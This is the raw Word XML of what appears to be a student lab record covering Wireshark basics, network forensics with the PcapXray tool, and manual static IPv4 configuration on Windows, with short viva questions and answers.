    <w:p w14:paraId="7B4D6EB0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. What is Wireshark?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="649C546A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5C5F57B9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Wireshark is a network protocol analyzer used to capture, monitor, and analyze</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50B53FA7" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>network traffic in real time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5457D5A4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. What is a packet in a computer network?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48ABC49A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0A2217D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A packet is a small unit of data transmitted from one device to another over a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66EB6E35" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70EFD120" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. What is the purpose of capturing network traffic?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B36B72E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3D1E319C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Capturing network traffic helps in troubleshooting network problems,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A61F59A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>monitoring performance, and investigating security incidents.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B17FD2C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. What is a capture filter in Wireshark?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52584DDC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20AFD8B3" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A capture filter is used to capture only specific types of network traffic during</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15191476" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>packet collection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E32A6A4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="782FCF1F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>host 192.168.1.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D29C787" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. What is a display filter in Wireshark?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26D87C35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5A21C1E3" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A display filter is used to view specific packets from the captured data without</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C1809FD" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>affecting the original capture.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="214417A9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C4C85B0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EB17BDE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E9BFB3" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Ex.No:13</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="476C1DE1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>NETWORK FORENSICS USING PCAPXRAY TOOL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C31124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6B7541BB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>To analyze a PCAP file using PcapXray and visualize network activity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6790DB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for basic network forensic investigation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C2CE704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ALGORITHM:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61A76CE7" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. Install PcapXray dependencies using: sudo pip3 install -r requirements.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F09BBB2" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. Launch the tool with: sudo python3 PcapXray.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63729D70" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Open the web interface and upload the given PCAP file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F0EC29B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Click Analyze to process the packet data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="344C83E2" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. View the generated network topology and communication graph.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="766C4B31" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>6. Examine hosts, protocols, and suspicious connections.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="338D8BB1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>7. Save the generated report and diagrams for documentation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5834C690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99942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99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88)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BB2642A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B9A80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3E6EF4DF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Network forensics was successfully carried out using PcapXray, and the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B4E5EE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>tool visualized hosts, protocols, and communication flows from the provided</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E5A9E9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>PCAP file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CB4304E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="17ADDFF4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. What is network forensics?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04754F4A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236F6D7A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Network forensics is the process of capturing, monitoring, and analyzing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04C79F84" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>network traffic to investigate security incidents and collect digital evidence.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793F3549" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. What is PcapXray?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08EC236A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66175094" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>PcapXray is a network forensic tool used to visualize and analyze packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="277B2B03" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>capture (PCAP) files to understand network activities and detect suspicious</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B2DE57C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>behavior.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AC9A641" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. What is a PCAP file?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54FBEE25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5FEBD5E2" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A PCAP (Packet Capture) file stores network packets captured from a network</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75793423" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>interface for later analysis.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45D21847" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Why is network traffic analysis important in digital forensics?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27FA357C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4E299C8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Network traffic analysis helps investigators identify cyberattacks, trace</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44326F4A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>malicious activities, recover evidence, and understand communication between</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DE4375B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>systems.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="172C9738" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. What information can be obtained from a PCAP file?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24B20E2C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5DD664C1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A PCAP file can provide information such as source and destination IP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04E437DA" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>addresses, protocols used, timestamps, ports, and transmitted data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="423F63B6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="14E11BD4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Ex.No:14</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF55E46" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>LEARNING AND ASSIGNMENT OF IP ADDRESS MANUALLY TO</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="522E5721" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>COMPUTERS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56D17390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3C4B4EB4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>To manually assign a static IPv4 address to a computer and verify</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30171EBE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>network connectivity using subnet mask, default gateway, and DNS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02032037" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>configuration.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CF7928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INTRODUCTION:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50BC455E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>In a computer network, devices can obtain IP addresses either</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61BE0435" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>automatically through DHCP or manually through static assignment.Static IP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51B45605" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>assignment is used in labs, servers, and controlled networks where fixed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E54E5D2" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>addressing is required.By configuring the IP address, subnet mask, default</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A016142" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>gateway, and DNS manually, we ensure the system correctly communicates</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51FD151D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>within the LAN and accesses external networks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="751FE834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ALGORITHM:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="641BF798" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. Open Control Panel → Network and Sharing Center.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FF660DB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. Click Change adapter settings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49EE74D8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Right-click the active network adapter → Properties.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C0560A7" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Select Internet Protocol Version 4 (TCP/IPv4) → Properties.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5559CCDF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. Choose Use the following IP address. Enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7115578F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ACCECE7" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>IP Address: 172.16.36.100</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02A93F9A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1F996B7" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Subnet Mask: 255.255.0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F17C4EC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5DEA656E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Default Gateway: 172.16.36.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="044202AF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>6.Choose Use the following DNS server addresses.Enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="736D9F41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4F837CD8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Preferred DNS: 172.16.36.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02594A75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68A11C4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Alternate DNS: 8.8.8.8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69D86CF0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>7.Click OK to save the settings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ED810C6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>8.Open Command Prompt and verify configuration using: ipconfig.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="320850C0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="040EA0E8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70357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03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94)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="403F9EE0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>BEFORE:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63BED2DC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>AFTER:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AAC39CF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RESULT:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3285A7" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Thus, the manual IP assignment was completed and validated.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293E2E23" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
